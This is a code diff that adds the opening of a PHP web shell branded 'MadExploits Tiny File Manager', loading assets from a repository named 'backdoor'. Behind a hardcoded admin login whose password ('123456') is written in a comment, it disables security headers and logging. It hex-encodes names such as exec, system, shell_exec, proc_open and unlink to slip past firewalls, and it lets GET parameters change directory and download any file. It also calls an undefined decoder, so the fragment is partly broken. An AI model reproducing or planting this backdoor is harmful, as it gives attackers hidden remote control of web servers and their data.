@@ -1,3 +1,253 @@
+<?php
+session_start();
+
+define('USERNAME', 'admin');
+// password: 123456
+define('PASSWORD_HASH', '$2y$10$ZOI31HwP1yz1swLQRXVGm.eFBjrksquAp291rUwM2ds2XFLyPwOhq'); 
+
+if (isset($_POST['fm_usr'], $_POST['fm_pwd'])) {
+    if ($_POST['fm_usr'] === USERNAME && password_verify($_POST['fm_pwd'], PASSWORD_HASH)) {
+        $_SESSION['logged_in'] = true;
+    } else {
+        $error = "Username atau password salah!";
+    }
+}
+
+if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>MadExploits</title>
+        <link rel="icon" type="image/png" sizes="16x16" href="https://www.php.net/favicon-16x16.png?v=2">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.4.1/css/bootstrap.min.css">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background: url("https://raw.githubusercontent.com/exploits77/backdoor/refs/heads/main/hexagon.gif") repeat;
+                margin: 0;
+                padding: 0;
+            }
+            .login-wrapper {
+                height: 100vh;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+            }
+            .login-box {
+                width: 360px;
+                margin-left: auto;
+                margin-right: auto;
+				padding: 50px 50px;
+                background: #fff;
+                border-radius: 10px;
+                box-shadow: 0 6px 20px rgba(0,0,0,0.15);
+                text-align: center;
+            }
+            .login-box h2 {
+                margin: 0;
+                font-weight: bold;
+                font-size: 36px;
+                color: #000;
+            }
+            .login-box h2 span {
+                color: #28a745; 
+            }
+            .login-box small {
+                display: block;
+                color: #444;
+                margin-bottom: 25px;
+                font-size: 14px;
+            }
+            .form-control {
+                background: #fff;
+                border: 1px solid #ccc;
+                color: #000;
+                border-radius: 5px;
+                margin-bottom: 15px;
+            }
+            .btn-success {
+                width: 100%;
+                border-radius: 5px;
+                padding: 10px;
+                font-size: 16px;
+            }
+            .error {
+                color: #f55;
+                margin-bottom: 10px;
+            }
+            .footer {
+                margin-top: 20px;
+                color: #777;
+                font-size: 13px;
+                text-align: center;
+            }
+            @media (max-width: 480px) {
+            .login-box {
+                width: 80%;
+                padding: 40px 40px;
+            }
+            .login-box h2 {
+                font-size: 28px;
+            }
+            .login-box small {
+                font-size: 12px;
+            }
+            .btn-success {
+                font-size: 14px;
+                padding: 8px;
+            }
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-wrapper">
+            <div class="login-box">
+                <h2>Mad-<span>Exploits</span></h2>
+                <small>Tiny File Manager</small>
+                <?php if (!empty($error)) echo "<div class='error'>$error</div>"; ?>
+                <form method="post">
+                    <div class="form-group">
+                        <input type="text" name="fm_usr" class="form-control" placeholder="Username" required>
+                    </div>
+                    <div class="form-group">
+                        <input type="password" name="fm_pwd" class="form-control" placeholder="Password" required>
+                    </div>
+                    <button type="submit" class="btn btn-success">Sign in</button>
+                </form>
+            </div>
+            <div class="footer">© <a href="https://github.com/MadExploits/">MadExploits</a></div>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+header("X-XSS-Protection: 0");
+ob_start();
+set_time_limit(0);
+error_reporting(0);
+ini_set('display_errors', 0);
+
+function uhex($hex) { return hex2bin($hex); }
+
+$Array = [
+    '7068705f756e616d65',
+    '70687076657273696f6e',
+    '6368646972',
+    '676574637764',
+    '707265675f73706c6974',
+];
+$GNJ = [];
+foreach ($Array as $a) {
+    $GNJ[] = uhex($a);
+}
+
+?>
+<?php
+@set_time_limit(0);
+@clearstatcache();
+@ini_set('error_log', NULL);
+@ini_set('log_errors', 0);
+@ini_set('max_execution_time', 0);
+@ini_set('output_buffering', 0);
+@ini_set('display_errors', 0);
+# function WAF
+
+$Array = [
+    '676574637764', # ge  tcw d => 0
+    '676c6f62', # gl ob => 1
+    '69735f646972', # is_d ir => 2
+    '69735f66696c65', # is_ file => 3
+    '69735f7772697461626c65', # is_wr iteable => 4
+    '69735f7265616461626c65', # is_re adble => 5
+    '66696c657065726d73', # fileper ms => 6
+    '66696c65', # f ile => 7
+    '7068705f756e616d65', # php_unam e => 8
+    '6765745f63757272656e745f75736572', # getc urrentuser => 9
+    '68746d6c7370656369616c6368617273', # html special => 10
+    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11
+    '6d6b646972', # mk dir => 12
+    '746f756368', # to uch => 13
+    '6368646972', # ch dir => 14
+    '72656e616d65', # ren ame => 15
+    '65786563', # exe c => 16
+    '7061737374687275', # pas sthru => 17
+    '73797374656d', # syst em => 18
+    '7368656c6c5f65786563', # sh ell_exec => 19
+    '706f70656e', # p open => 20
+    '70636c6f7365', # pcl ose => 21
+    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22
+    '70726f635f6f70656e', # p roc_open => 23
+    '756e6c696e6b', # un link => 24
+    '726d646972', # rmd ir => 25
+    '666f70656e', # fop en => 26
+    '66636c6f7365', # fcl ose => 27
+    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28
+    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29
+    '63686d6f64', # ch mod => 30
+    '7379735f6765745f74656d705f646972', # temp _dir => 31
+    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32
+    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33
+];
+$hitung_array = count($Array);
+for ($i = 0; $i < $hitung_array; $i++) {
+    $fungsi[] = unx($Array[$i]);
+}
+
+if (isset($_GET['d'])) {
+    $cdir = unx($_GET['d']);
+    $fungsi[14]($cdir);
+} else {
+    $cdir = $fungsi[0]();
+}
+
+function file_ext($file)
+{
+    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
+        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
+    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
+        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
+    } else if (mime_content_type($file) == 'text/javascript') {
+        return '<i class="fa-brands fa-square-js"></i>';
+    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
+        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
+    } else if (mime_content_type($file) == 'text/plain') {
+        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
+    } else if (mime_content_type($file) == 'application/pdf') {
+        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
+    } else {
+        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
+    }
+}
+
+function download($file)
+{
+
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename=' . basename($file));
+        header('Content-Transfer-Encoding: binary');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        ob_clean();
+        flush();
+        readfile($file);
+        exit;
+    }
+}
+
+if ($_GET['don'] == true) {
+    $FilesDon = download(unx($_GET['don']));
+}
+?>
 <!DOCTYPE html>
 <html lang="en">
 
